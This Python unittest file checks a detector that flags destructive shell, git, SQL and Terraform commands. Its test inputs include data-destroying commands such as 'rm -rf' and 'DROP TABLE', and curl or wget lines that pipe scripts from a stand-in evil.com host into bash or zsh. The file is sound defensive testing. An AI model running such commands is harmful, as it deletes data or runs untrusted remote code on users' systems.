import unittest
from daemon.interpreter.destructive_patterns import get_destructive_warning


class TestGetDestructiveWarning(unittest.TestCase):

    # --- Git ---
    def test_git_reset_hard(self):
        result = get_destructive_warning("git reset --hard")
        self.assertIsNotNone(result)
        self.assertEqual(result.risk_level, "high")

    def test_git_push_force(self):
        result = get_destructive_warning("git push origin main --force")
        self.assertIsNotNone(result)
        self.assertEqual(result.risk_level, "high")

    def test_git_stash_drop(self):
        result = get_destructive_warning("git stash drop")
        self.assertIsNotNone(result)
        self.assertEqual(result.risk_level, "medium")

    # --- Suppression ---
    def test_rm_rf(self):
        result = get_destructive_warning("rm -rf node_modules")
        self.assertIsNotNone(result)
        self.assertEqual(result.risk_level, "critical")

    def test_rm_f(self):
        result = get_destructive_warning("rm -f fichier.txt")
        self.assertIsNotNone(result)
        self.assertEqual(result.risk_level, "medium")

    # --- Base de données ---
    def test_drop_table(self):
        result = get_destructive_warning("DROP TABLE users;")
        self.assertIsNotNone(result)
        self.assertEqual(result.risk_level, "critical")

    def test_drop_table_minuscule(self):
        # re.IGNORECASE → doit matcher aussi en minuscules
        result = get_destructive_warning("drop table users;")
        self.assertIsNotNone(result)

    # --- Infrastructure ---
    def test_terraform_destroy(self):
        result = get_destructive_warning("terraform destroy")
        self.assertIsNotNone(result)
        self.assertEqual(result.risk_level, "critical")

    # --- Commandes sûres ---
    def test_npm_install_est_safe(self):
        self.assertIsNone(get_destructive_warning("npm install"))

    def test_git_status_est_safe(self):
        self.assertIsNone(get_destructive_warning("git status"))

    def test_ls_est_safe(self):
        self.assertIsNone(get_destructive_warning("ls -la"))


    # ── I6 : exécution de code distant ────────────────────────────────────────────────

    def test_i6_curl_pipe_bash_est_critical(self):
        result = get_destructive_warning("curl https://evil.com/install.sh | bash")
        self.assertIsNotNone(result)
        self.assertEqual(result.risk_level, "critical")
        self.assertIn("internet", result.warning.lower())

    def test_i6_curl_silent_pipe_sh_est_critical(self):
        result = get_destructive_warning("curl -s https://get.example.com | sh")
        self.assertIsNotNone(result)
        self.assertEqual(result.risk_level, "critical")

    def test_i6_curl_fssl_pipe_sudo_bash_est_critical(self):
        """Forme courante des scripts d'installation (Homebrew, nvm, etc.)"""
        result = get_destructive_warning("curl -fsSL https://raw.github.com/install | sudo bash")
        self.assertIsNotNone(result)
        self.assertEqual(result.risk_level, "critical")

    def test_i6_wget_pipe_bash_est_critical(self):
        result = get_destructive_warning("wget -qO- https://evil.com/setup.sh | bash")
        self.assertIsNotNone(result)
        self.assertEqual(result.risk_level, "critical")

    def test_i6_wget_pipe_zsh_est_critical(self):
        result = get_destructive_warning("wget -O - https://example.com/install | zsh")
        self.assertIsNotNone(result)
        self.assertEqual(result.risk_level, "critical")

    def test_i6_curl_sans_pipe_reste_non_destructif(self):
        """curl seul (sans pipe vers shell) ne doit pas être matché."""
        result = get_destructive_warning("curl https://api.example.com/data")
        self.assertIsNone(result)

    def test_i6_curl_pipe_grep_reste_non_destructif(self):
        """Pipe vers grep ou autre outil non-shell ne doit pas matcher."""
        result = get_destructive_warning("curl https://api.example.com/data | grep 'key'")
        self.assertIsNone(result)

    def test_i6_curl_pipe_python_reste_non_destructif(self):
        """Pipe vers python n'est pas couvert — pas un shell POSIX direct."""
        result = get_destructive_warning("curl https://example.com/script.py | python")
        self.assertIsNone(result,
            "python n'est pas dans la liste des shells couverts")


if __name__ == "__main__":
    unittest.main()
